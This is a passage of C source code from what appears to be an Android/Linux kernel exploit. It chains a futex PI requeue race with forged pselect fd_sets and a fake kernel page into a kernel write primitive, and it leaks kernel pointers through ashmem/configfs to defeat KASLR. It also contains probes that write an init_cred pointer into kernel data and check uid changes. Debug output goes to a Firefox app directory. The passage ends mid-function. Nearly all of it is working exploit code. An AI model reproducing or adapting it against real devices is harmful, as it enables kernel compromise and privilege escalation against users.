#include "common.h"

#ifndef CFGPROBE_ONLY_DIAG
#define CFGPROBE_ONLY_DIAG 0
#endif
#ifndef CFI_TRANSPORT_ONLY_DIAG
#define CFI_TRANSPORT_ONLY_DIAG 0
#endif
#ifndef CFI_STAGE_ONLY
#define CFI_STAGE_ONLY 0
#endif
#ifndef CFI_KASLR_BASE_CONST
#define CFI_KASLR_BASE_CONST 0ULL
#endif
#ifndef ALLOW_STALE_HARDCODED_KASLR
#define ALLOW_STALE_HARDCODED_KASLR 0
#endif
#ifndef PERF_LEAK_ONLY
#define PERF_LEAK_ONLY 0
#endif
#ifndef SLIDE_ONLY_DIAG
#define SLIDE_ONLY_DIAG 0
#endif
#ifndef DIRECT_WRITE_ONLY_DIAG
#define DIRECT_WRITE_ONLY_DIAG 0
#endif
#ifndef DIRECT_WRITE_BOOTID_PROBE
#define DIRECT_WRITE_BOOTID_PROBE 0
#endif
#ifndef DIRECT_WRITE_ROUTE_ONLY_PROBE
#define DIRECT_WRITE_ROUTE_ONLY_PROBE 0
#endif
#ifndef PSELECT_ONLY_PROBE
#define PSELECT_ONLY_PROBE 0
#endif
#ifndef NORMAL_PI_SCHED_PROBE
#define NORMAL_PI_SCHED_PROBE 0
#endif
#ifndef PSELECT_LAYOUT_ONLY_PROBE
#define PSELECT_LAYOUT_ONLY_PROBE 0
#endif
#ifndef KERNEL_PAGE_RECLAIM_PROBE
#define KERNEL_PAGE_RECLAIM_PROBE 0
#endif
#ifndef ROUTE_SKIP_CONSUMER
#define ROUTE_SKIP_CONSUMER 0
#endif
#include <stdarg.h>

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int route_requeue_done;  /* requeue 调用完成后设置 */
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

static void crash_debug_log(int truncate_first, const char *fmt, ...);
void run_main_route_threads(void);

static int parse_u64_hex_env(const char *name, uint64_t *out) {
  const char *s = getenv(name);
  if (!s || !*s) {
    return 0;
  }
  errno = 0;
  char *end = NULL;
  unsigned long long v = strtoull(s, &end, 0);
  if (errno != 0 || end == s || (end && *end != '\0') || v == 0) {
    crash_debug_log(0, "EXT_KASLR_ENV_INVALID: %s=%s errno=%d\n", name, s,
                    errno);
    return 0;
  }
  *out = (uint64_t)v;
  return 1;
}

static int apply_external_kaslr_override(void) {
  uint64_t base = (uint64_t)CFI_KASLR_BASE_CONST;
  uint64_t env_base = 0;
  if (parse_u64_hex_env("CFI_KASLR_BASE", &env_base)) {
    base = env_base;
  }
  if (base == 0) {
    return 0;
  }
  if (base < (uint64_t)KIMAGE_TEXT_BASE) {
    crash_debug_log(0,
                    "EXT_KASLR_REJECT: base=0x%llx below KIMAGE_TEXT_BASE=0x%llx\n",
                    (unsigned long long)base,
                    (unsigned long long)KIMAGE_TEXT_BASE);
    return 0;
  }
  kaslr_base = (uintptr_t)base;
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_step = 0;
  crash_debug_log(0, "STEP1_EXTERNAL_KASLR: base=0x%llx slide=0x%llx source=%s\n",
                  (unsigned long long)kaslr_base,
                  (unsigned long long)kaslr_slide,
                  env_base ? "env:CFI_KASLR_BASE" : "compile:CFI_KASLR_BASE_CONST");
  return 1;
}

static int run_direct_write_diag(void) {
  const char *arm = getenv("DIRECT_WRITE_ARM");
  uint64_t target = 0;
  uint64_t value = 0;
  int have_target = parse_u64_hex_env("DIRECT_WRITE_TARGET", &target);
  int have_value = parse_u64_hex_env("DIRECT_WRITE_VALUE", &value);
  if (!arm || strcmp(arm, "1") != 0 || !have_target || !have_value) {
    crash_debug_log(0,
                    "DIRECT_WRITE_ONLY_DIAG_STOP_MISSING_ENV: need "
                    "DIRECT_WRITE_ARM=1 DIRECT_WRITE_TARGET=0x... "
                    "DIRECT_WRITE_VALUE=0x... optional DIRECT_WRITE_SHAPE=1\n");
    return 2;
  }
  if (target < 8 || !is_kernel_ptr((uintptr_t)target) ||
      !is_kernel_ptr((uintptr_t)value)) {
    crash_debug_log(0,
                    "DIRECT_WRITE_ONLY_DIAG_REJECT: target=0x%llx "
                    "value=0x%llx target>=8/kernelptr=%d/%d value_kernel=%d\n",
                    (unsigned long long)target,
                    (unsigned long long)value,
                    target >= 8, is_kernel_ptr((uintptr_t)target),
                    is_kernel_ptr((uintptr_t)value));
    return 2;
  }

  crash_debug_log(0,
                  "DIRECT_WRITE_ONLY_DIAG_START: target=0x%llx value=0x%llx "
                  "shape=%s uid=%u euid=%u\n",
                  (unsigned long long)target,
                  (unsigned long long)value,
                  getenv("DIRECT_WRITE_SHAPE") ? getenv("DIRECT_WRITE_SHAPE") : "1",
                  getuid(), geteuid());
  set_pselect_write((uintptr_t)target, (uintptr_t)value, 1);
  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  crash_debug_log(0,
                  "DIRECT_WRITE_ONLY_DIAG_PAGE: page=0x%llx lock=0x%llx "
                  "w0=0x%llx task=0x%llx\n",
                  (unsigned long long)page_base,
                  (unsigned long long)fake_lock,
                  (unsigned long long)fake_w0,
                  (unsigned long long)fake_task);
  if (!page_base) {
    clear_pselect_write();
    return 1;
  }
  run_main_route_threads();
  clear_pselect_write();
  crash_debug_log(0,
                  "DIRECT_WRITE_ONLY_DIAG_DONE: route_done=%d calls=%d "
                  "success=%d uid=%u euid=%u cfi_step=%d errno=%d\n",
                  atomic_load(&route_done),
                  atomic_load(&consumer_calls),
                  atomic_load(&consumer_success),
                  getuid(), geteuid(), cfi_last_step, cfi_last_errno);
  return 0;
}

static int run_direct_write_bootid_probe(void) {
  char boot_before[128];
  char boot_after[128];
  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_before, sizeof(boot_before));

  uintptr_t target = SLIDE_RANDOM_BOOT_ID_DATA;
  uintptr_t value = INIT_CRED_P0;
  crash_debug_log(0,
                  "BOOTID_WRITE_PROBE_START: before=%s target=0x%llx "
                  "value=0x%llx shape=1 uid=%u euid=%u\n",
                  boot_before,
                  (unsigned long long)target,
                  (unsigned long long)value,
                  getuid(), geteuid());

  setenv("DIRECT_WRITE_SHAPE", "1", 0);
  set_pselect_write(target, value, 1);
  pin_to_core(CORE);
  crash_debug_log(0, "BOOTID_WRITE_PROBE_PREPARE_BEGIN\n");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  crash_debug_log(0,
                  "BOOTID_WRITE_PROBE_PAGE: page=0x%llx lock=0x%llx "
                  "w0=0x%llx task=0x%llx\n",
                  (unsigned long long)page_base,
                  (unsigned long long)fake_lock,
                  (unsigned long long)fake_w0,
                  (unsigned long long)fake_task);
  if (!page_base) {
    clear_pselect_write();
    return 2;
  }

  run_main_route_threads();
  clear_pselect_write();

  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_after, sizeof(boot_after));
  crash_debug_log(0,
                  "BOOTID_WRITE_PROBE_DONE: before=%s after=%s changed=%d "
                  "route_done=%d calls=%d success=%d cfi_step=%d errno=%d\n",
                  boot_before, boot_after, strcmp(boot_before, boot_after) != 0,
                  atomic_load(&route_done),
                  atomic_load(&consumer_calls),
                  atomic_load(&consumer_success),
                  cfi_last_step, cfi_last_errno);
  return strcmp(boot_before, boot_after) != 0 ? 0 : 1;
}

static int run_direct_write_route_only_probe(void) {
  char boot_before[128];
  char boot_after[128];
  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_before, sizeof(boot_before));
  crash_debug_log(0,
                  "ROUTE_ONLY_PROBE_START: boot=%s uid=%u euid=%u\n",
                  boot_before, getuid(), geteuid());

  /* Deliberately do not call set_pselect_write() and do not prepare a fake
   * kernel page.  The fops route has a DIRECT_WRITE_ROUTE_ONLY_PROBE branch
   * that uses a safe fd_set and timerfd only to measure consumer handoff. */
  page_base = 0;
  fake_lock = 0;
  fake_w0 = 0;
  fake_task = 0;
  fake_fops = 0;
  pin_to_core(CORE);
  run_main_route_threads();

  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_after, sizeof(boot_after));
  crash_debug_log(0,
                  "ROUTE_ONLY_PROBE_DONE: before=%s after=%s changed=%d "
                  "route_done=%d calls=%d success=%d waiter_tid=%d "
                  "cfi_step=%d errno=%d\n",
                  boot_before, boot_after, strcmp(boot_before, boot_after) != 0,
                  atomic_load(&route_done),
                  atomic_load(&consumer_calls),
                  atomic_load(&consumer_success),
                  atomic_load(&waiter_tid), cfi_last_step, cfi_last_errno);
  return atomic_load(&consumer_calls) > 0 ? 0 : 1;
}

static int run_cfi_transport_only_diag(void) {
  char boot_id[128];
  read_first_line("/proc/sys/kernel/random/boot_id", boot_id,
                  sizeof(boot_id));
  crash_debug_log(1,
                  "CFI_TRANSPORT_ONLY_START: boot=%s uid=%u euid=%u\n",
                  boot_id, getuid(), geteuid());

  int fd = open_ashmem_device();
  if (fd < 0) {
    crash_debug_log(0, "CFI_TRANSPORT_OPEN_FAIL: errno=%d\n", errno);
    return 2;
  }

  /* Reproduce only the ConfigFS name/blob setup and the following pwrite.
   * No fake page, pselect write, scheduler route, or kernel-address sink is
   * involved.  With a fresh ashmem object, pwrite should expose the
   * pre-hijack ashmem write error that later appears as CFI step 1. */
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  uintptr_t target = data_addr(ASHMEM_MISC) + 0x10;
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 33);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);

  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  crash_debug_log(0,
                  "CFI_TRANSPORT_SET_NAME: ret=%d errno=%d target=0x%llx\n",
                  set_ret, set_errno, (unsigned long long)target);

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  errno = 0;
  ssize_t wr = pwrite(fd, payload, sizeof(payload), 0);
  int wr_errno = errno;
  crash_debug_log(0,
                  "CFI_TRANSPORT_PWRITE: ret=%zd errno=%d payload_len=%zu\n",
                  wr, wr_errno, sizeof(payload));
  close(fd);

  crash_debug_log(0, "CFI_TRANSPORT_ONLY_DONE: set_ret=%d set_errno=%d "
                     "pwrite_ret=%zd pwrite_errno=%d\n",
                  set_ret, set_errno, wr, wr_errno);
  return 0;
}

static int run_pselect_only_probe(void) {
  char boot_before[128];
  char boot_after[128];
  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_before, sizeof(boot_before));
  crash_debug_log(1,
                  "PSELECT_ONLY_START: boot=%s uid=%u euid=%u nfds=%d\n",
                  boot_before, getuid(), geteuid(), PSELECT_ROUTE_NFDS);

  int pipefd[2];
  if (pipe(pipefd) != 0) {
    crash_debug_log(0, "PSELECT_ONLY_PIPE_FAIL: errno=%d\n", errno);
    return 2;
  }

  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    block_fd = pipefd[0];
    crash_debug_log(0, "PSELECT_ONLY_TIMERFD_FAIL: errno=%d using_pipe\n",
                    errno);
  }

  int probe_fd = PSELECT_ROUTE_NFDS - 1;
  if (dup2(block_fd, probe_fd) < 0) {
    int saved_errno = errno;
    crash_debug_log(0, "PSELECT_ONLY_DUP2_FAIL: errno=%d probe_fd=%d\n",
                    saved_errno, probe_fd);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return 2;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  FD_ZERO(&in);
  FD_ZERO(&out);
  FD_ZERO(&ex);
  FD_SET(probe_fd, &in);

  struct timespec timeout = {
    .tv_sec = 1,
    .tv_nsec = 0,
  };
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  read_first_line("/proc/sys/kernel/random/boot_id",
                  boot_after, sizeof(boot_after));
  crash_debug_log(0,
                  "PSELECT_ONLY_RET: ret=%d errno=%d before=%s after=%s "
                  "changed=%d isset=%d\n",
                  ret, saved_errno, boot_before, boot_after,
                  strcmp(boot_before, boot_after) != 0,
                  FD_ISSET(probe_fd, &in));

  close(probe_fd);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
  return ret == 0 ? 0 : 1;
}

static int run_pselect_layout_only_probe(void) {
  const uintptr_t target = 0x1111111111111118ULL;
  const uintptr_t value = 0x2222222222222222ULL;
  const uintptr_t task = 0x3333333333333333ULL;
  const uintptr_t lock = 0x4444444444444444ULL;
  fd_set in, out, ex;
  fake_task = task;
  fake_lock = lock;
  set_pselect_write(target, value, 1);
  prepare_pselect_fdsets(&in, &out, &ex);
  crash_debug_log(1,
                  "PSELECT_LAYOUT_IN: w0=%016llx w1=%016llx w2=%016llx "
                  "w3=%016llx w4=%016llx\\n",
                  (unsigned long long)fdset_get_word(&in, 0),
                  (unsigned long long)fdset_get_word(&in, 1),
                  (unsigned long long)fdset_get_word(&in, 2),
                  (unsigned long long)fdset_get_word(&in, 3),
                  (unsigned long long)fdset_get_word(&in, 4));
  crash_debug_log(0,
                  "PSELECT_LAYOUT_OUT: w0=%016llx w1=%016llx w2=%016llx "
                  "w3=%016llx w4=%016llx\\n",
                  (unsigned long long)fdset_get_word(&out, 0),
                  (unsigned long long)fdset_get_word(&out, 1),
                  (unsigned long long)fdset_get_word(&out, 2),
                  (unsigned long long)fdset_get_word(&out, 3),
                  (unsigned long long)fdset_get_word(&out, 4));
  crash_debug_log(0,
                  "PSELECT_LAYOUT_EX: w0=%016llx w1=%016llx w2=%016llx "
                  "w3=%016llx w4=%016llx\\n",
                  (unsigned long long)fdset_get_word(&ex, 0),
                  (unsigned long long)fdset_get_word(&ex, 1),
                  (unsigned long long)fdset_get_word(&ex, 2),
                  (unsigned long long)fdset_get_word(&ex, 3),
                  (unsigned long long)fdset_get_word(&ex, 4));
  int ok = fdset_get_word(&in, 2) == value &&
           fdset_get_word(&in, 3) == 0 &&
           fdset_get_word(&in, 4) == target &&
           fdset_get_word(&out, 0) == target - 8 &&
           fdset_get_word(&out, 1) == value &&
           fdset_get_word(&out, 2) == 0 &&
           fdset_get_word(&out, 3) == FAKE_WAITER_PRIO &&
           fdset_get_word(&out, 4) == 0 &&
           fdset_get_word(&ex, 0) == task &&
           fdset_get_word(&ex, 1) == lock &&
           fdset_get_word(&ex, 2) == 0 &&
           fdset_get_word(&ex, 3) == 0 &&
           fdset_get_word(&ex, 4) == 0;
  clear_pselect_write();
  crash_debug_log(0, "PSELECT_LAYOUT_DONE: ok=%d no_kernel_route=1\\n", ok);
  return ok ? 0 : 1;
}

static int run_kernel_page_reclaim_probe(void) {
  char boot_before[128], boot_after[128];
  read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
                  sizeof(boot_before));
  crash_debug_log(1, "KPAGE_RECLAIM_START: boot=%s uid=%u euid=%u\\n",
                  boot_before, getuid(), geteuid());
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                  sizeof(boot_after));
  int aligned = page_base && !(page_base & (ORDER3_SIZE - 1));
  int ordered = page_base && fake_lock > page_base && fake_w0 > page_base &&
                fake_task > page_base && fake_fops > page_base;
  crash_debug_log(0,
                  "KPAGE_RECLAIM_DONE: before=%s after=%s changed=%d "
                  "base=%016llx aligned=%d lock=%016llx w0=%016llx "
                  "task=%016llx fops=%016llx ordered=%d no_route=1\\n",
                  boot_before, boot_after,
                  strcmp(boot_before, boot_after) != 0,
                  (unsigned long long)page_base, aligned,
                  (unsigned long long)fake_lock, (unsigned long long)fake_w0,
                  (unsigned long long)fake_task, (unsigned long long)fake_fops,
                  ordered);
  return aligned && ordered && strcmp(boot_before, boot_after) == 0 ? 0 : 1;
}

static uint32_t normal_pi_word;
static atomic_int normal_pi_owner_locked;
static atomic_int normal_pi_release_owner;
static atomic_int normal_pi_waiter_started;
static atomic_int normal_pi_waiter_tid;
static atomic_int normal_pi_waiter_result;

static void *normal_pi_owner_thread(void *arg __attribute__((unused))) {
  long ret = futex_op(&normal_pi_word, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (ret != 0) return NULL;
  atomic_store(&normal_pi_owner_locked, 1);
  while (!atomic_load(&normal_pi_release_owner)) usleep(1000);
  futex_op(&normal_pi_word, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static void *normal_pi_waiter_thread(void *arg __attribute__((unused))) {
  atomic_store(&normal_pi_waiter_tid, (int)syscall(SYS_gettid));
  atomic_store(&normal_pi_waiter_started, 1);
  long ret = futex_op(&normal_pi_word, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&normal_pi_waiter_result, (int)ret);
  if (ret == 0) futex_op(&normal_pi_word, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

static int run_normal_pi_sched_probe(void) {
  char boot_before[128], boot_after[128];
  pthread_t owner, waiter;
  normal_pi_word = 0;
  atomic_store(&normal_pi_owner_locked, 0);
  atomic_store(&normal_pi_release_owner, 0);
  atomic_store(&normal_pi_waiter_started, 0);
  atomic_store(&normal_pi_waiter_tid, 0);
  atomic_store(&normal_pi_waiter_result, -1);
  read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
                  sizeof(boot_before));
  crash_debug_log(1, "NORMAL_PI_START: boot=%s uid=%u euid=%u\\n",
                  boot_before, getuid(), geteuid());
  if (pthread_create(&owner, NULL, normal_pi_owner_thread, NULL) != 0) return 2;
  while (!atomic_load(&normal_pi_owner_locked)) usleep(1000);
  if (pthread_create(&waiter, NULL, normal_pi_waiter_thread, NULL) != 0) {
    atomic_store(&normal_pi_release_owner, 1);
    pthread_join(owner, NULL);
    return 2;
  }
  while (!atomic_load(&normal_pi_waiter_started)) usleep(1000);
  usleep(50000);
  int tid = atomic_load(&normal_pi_waiter_tid);
  errno = 0;
  long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
  int sched_errno = errno;
  atomic_store(&normal_pi_release_owner, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
                  sizeof(boot_after));
  crash_debug_log(0,
                  "NORMAL_PI_DONE: before=%s after=%s changed=%d tid=%d "
                  "sched_ret=%ld sched_errno=%d waiter_ret=%d\\n",
                  boot_before, boot_after, strcmp(boot_before, boot_after) != 0,
                  tid, sched_ret, sched_errno,
                  atomic_load(&normal_pi_waiter_result));
  return sched_ret == 0 && atomic_load(&normal_pi_waiter_result) == 0 &&
                 strcmp(boot_before, boot_after) == 0 ? 0 : 1;
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  crash_debug_log(0, "WAITER_REQUEUE_WAIT_ENTER: tid=%d timeout_sec=%d\n", tid,
                  ROUTE_WAIT_SECONDS);
  errno = 0;
  int wait_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                          &f_pi_target, 0);
  int wait_errno = errno;
  crash_debug_log(0, "WAITER_REQUEUE_WAIT_RET: tid=%d ret=%d errno=%d\n", tid,
                  wait_ret, wait_errno);

  crash_debug_log(0, "WAITER_FOPS_ROUTE_ENTER: tid=%d\n", tid);
  do_pselect_fake_lock_route();
  crash_debug_log(0, "WAITER_FOPS_ROUTE_RET: tid=%d step=%d errno=%d\n", tid,
                  cfi_last_step, cfi_last_errno);
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);

  /* 等待 requeue 完成再释放 f_pi_target
   * FUTEX_CMP_REQUEUE_PI 返回 EDEADLK 时 requeue 可能已完成（内核内部）
   * 但如果 val3 不匹配返回 EAGAIN，则 requeue 未发生
   * 需要等 main thread 的 requeue 调用完成 */
  while (!atomic_load(&route_done) && !atomic_load(&route_requeue_done)) {
    usleep(1000);
  }
  /* requeue 已完成（或 route 已结束），释放 f_pi_target */
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  /* 之后再锁 f_pi_chain（waiter_thread 会在 do_select 后释放） */
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    /* 诊断: VIOLIN_SCHED_SETATTR_SELF=1 时对自身调用, 隔离 crash 来源 */
    int tid;
    const char *self_env = getenv("VIOLIN_SCHED_SETATTR_SELF");
    if (self_env && strcmp(self_env, "1") == 0) {
      tid = (int)syscall(SYS_gettid);  /* 对自身调用 */
    } else {
      tid = atomic_load(&waiter_tid);   /* 对 waiter 调用 (默认) */
    }
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        /* 交替 nice 值确保 __sched_setscheduler 实际调用 rt_mutex_adjust_pi */
        int consumer_nice = (atomic_load(&consumer_calls) & 1) ? 19 : 0;
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        } else if (calls_this_seq == 0) {
          dprintf(2, "sched_fail: tid=%d ret=%ld errno=%d\n",
                  tid, sched_ret, sched_errno);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&route_requeue_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  crash_debug_log(0, "ROUTE_PREP_CREATE: waiter owner consumer\n");
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  crash_debug_log(0, "ROUTE_PREP_CREATED: waiter tid=%d\n",
                  atomic_load(&waiter_tid));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  crash_debug_log(0, "ROUTE_PREP_CREATED: owner waiter_waiting=%d owner_started=%d\n",
                  atomic_load(&waiter_waiting), atomic_load(&owner_started));
#if !ROUTE_SKIP_CONSUMER
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  crash_debug_log(0, "ROUTE_PREP_CREATED: consumer\n");
#endif

  int wait_ticks = 0;
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    if ((wait_ticks++ % 100) == 0) {
      crash_debug_log(0,
                      "ROUTE_PREP_WAIT: ticks=%d waiter_waiting=%d owner_started=%d waiter_tid=%d\n",
                      wait_ticks, atomic_load(&waiter_waiting),
                      atomic_load(&owner_started), atomic_load(&waiter_tid));
    }
    usleep(1000);
  }

  crash_debug_log(0, "ROUTE_PREP_READY: waiter_tid=%d f_pi_target=%d\n",
                  atomic_load(&waiter_tid), f_pi_target);
  usleep(100000);

  /* requeue 用 val3=0 — errno=35 (EDEADLK) 是预期行为, consumer 仍能触发 PI chain walk */
  errno = 0;
  int requeue_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                             &f_pi_target, 0);
  crash_debug_log(0, "ROUTE_PREP_REQUEUE: ret=%d errno=%d\n", requeue_ret, errno);
  atomic_store(&route_requeue_done, 1);  /* 通知 owner 可以释放 f_pi_target */

  int done_ticks = 0;
  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    if ((done_ticks++ % 25) == 0) {
      crash_debug_log(0,
                      "ROUTE_PREP_DONE_WAIT: ticks=%d route_done=%d waiter_waiting=%d owner_started=%d\n",
                      done_ticks, atomic_load(&route_done),
                      atomic_load(&waiter_waiting), atomic_load(&owner_started));
    }
    usleep(10000);
  }
  crash_debug_log(0, "ROUTE_PREP_DONE: route_done=1\n");
}

static void crash_debug_write_one(const char *path, int truncate_first, const char *msg) {
  int flags = O_WRONLY | O_CREAT | (truncate_first ? O_TRUNC : O_APPEND);
  int fd = open(path, flags, 0644);
  if (fd < 0) {
    return;
  }
  size_t len = strlen(msg);
  size_t off = 0;
  while (off < len) {
    ssize_t n = write(fd, msg + off, len - off);
    if (n <= 0) {
      break;
    }
    off += (size_t)n;
  }
  fsync(fd);
  close(fd);
}

static void crash_debug_log(int truncate_first, const char *fmt, ...) {
  char buf[384];
  va_list ap;
  va_start(ap, fmt);
  int n = vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  if (n < 0) {
    return;
  }
  buf[sizeof(buf) - 1] = '\0';
  crash_debug_write_one("/data/data/org.mozilla.firefox/files/crash.txt", truncate_first, buf);
  crash_debug_write_one("/sdcard/Download/crash.txt", truncate_first, buf);
}

static ssize_t cfgprobe_debug_read64_at_pos(
    int fd, const char *name, uintptr_t target, uint64_t *value, off_t pos) {
  *value = 0;
  errno = 0;
  ssize_t rd = configfs_read_once_at_pos(fd, target, value, sizeof(*value), pos);
  int rd_errno = errno;
  uintptr_t page = target - (uintptr_t)pos;
  crash_debug_log(0,
                  "CFGPROBE_DBG: %s target=0x%llx page=0x%llx pos=%lld "
                  "rd=%zd rd_errno=%d value=0x%llx\n",
                  name, (unsigned long long)target,
                  (unsigned long long)page, (long long)pos, rd,
                  rd_errno, (unsigned long long)*value);
  errno = rd_errno;
  return rd;
}

static ssize_t cfgprobe_debug_read64(int fd, const char *name, uintptr_t target,
                                     uint64_t *value) {
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - sizeof(*value));
  return cfgprobe_debug_read64_at_pos(fd, name, target, value, pos);
}

static void cfgprobe_prehijack_pos_sanity(int fd, uintptr_t target) {
  static const off_t positions[] = {0, 1, 8, 16, 32, 64, 128};
  uint64_t value = 0;
  crash_debug_log(0,
                  "CFGPROBE_PREHIJACK_NOTE: ashmem fd still uses "
                  "ashmem_read_iter until fops hijack; rd=0/EOF is expected "
                  "when asma->size is 0\n");
  for (size_t i = 0; i < sizeof(positions) / sizeof(positions[0]); i++) {
    char label[64];
    snprintf(label, sizeof(label), "prehijack_pos_%lld",
             (long long)positions[i]);
    cfgprobe_debug_read64_at_pos(fd, label, target, &value, positions[i]);
  }
}

static int try_direct_configfs_kaslr_probe(void) {
  int fd = open_ashmem_device();
  if (fd < 0) {
    crash_debug_log(0, "CFGPROBE0_FAIL: open_ashmem errno=%d\n", errno);
    return 0;
  }

  /* Read the miscdevice.fops pointer slot, not the static misc_fops
   * file_operations object itself. */
  uintptr_t misc_fops_slot = data_addr(ASHMEM_MISC) + 0x10;
  uint64_t leaked_fops = 0;
  cfgprobe_prehijack_pos_sanity(fd, misc_fops_slot);
  errno = 0;
  ssize_t rd_misc =
      cfgprobe_debug_read64(fd, "misc_fops_slot", misc_fops_slot, &leaked_fops);
  int err_misc = errno;
